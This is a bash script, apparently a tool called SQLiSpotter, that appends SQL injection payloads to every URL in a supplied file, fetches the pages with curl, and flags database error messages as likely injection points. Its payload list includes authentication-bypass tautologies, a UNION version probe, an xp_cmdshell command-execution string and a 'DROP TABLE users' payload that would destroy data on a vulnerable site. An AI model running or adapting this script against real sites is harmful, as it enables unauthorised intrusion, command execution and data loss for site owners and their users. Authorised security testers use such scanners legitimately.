#!/bin/bash

# SQLiSpotter - Automated Erorr-Based SQL Injection Tester
# Usage: ./SQLiSpotter.sh urls.txt

# Check if file was passed as an argument
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <urls_file>"
    exit 1
fi

# File containing URLs
URLS_FILE="$1"

# Array of SQL injection payloads
PAYLOADS=(
    "'"
    "''"
    "' OR '1'='1"
    "' OR 1=1--"
    "' OR 1=1#"
    "' OR 1=1/*"
    "'; EXEC xp_cmdshell('dir'); --"
    "'; DROP TABLE users; --"
    "' OR 'x'='x"
    "' AND id IS NULL; --"
    "' UNION SELECT 1, @@version --"
    "' AND 1=(SELECT COUNT(*) FROM tablenames); --"
)

# Function to test each URL with each payload
test_sqli() {
    local url="$1"
    for payload in "${PAYLOADS[@]}"; do
        # Encode the payload for use in a URL
        encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote(input()))" <<< "$payload")
        # Append the payload to the URL
        test_url="${url}${encoded_payload}"
        # Fetch the page content
        response=$(curl -s --path-as-is --insecure "$test_url")
        # Check for common SQL error patterns
        if echo "$response" | grep -qiE "sql syntax|sql error|warning: mysql|unclosed quotation|odbc drivers error|invalid query|command not properly ended|oracle error|postgresql error|syntax error|unclosed quotation mark|mysql_fetch_array()|mysql_fetch_assoc()"; then
                echo -e "\033[0;31mPotential SQLi:\033[0m $test_url \n"
            break # Exit the payload loop as soon as a vulnerability is found
        fi
    done
}

# Main loop to read URLs from the file and test them
while IFS= read -r url; do
    test_sqli "$url"
done < "$URLS_FILE"
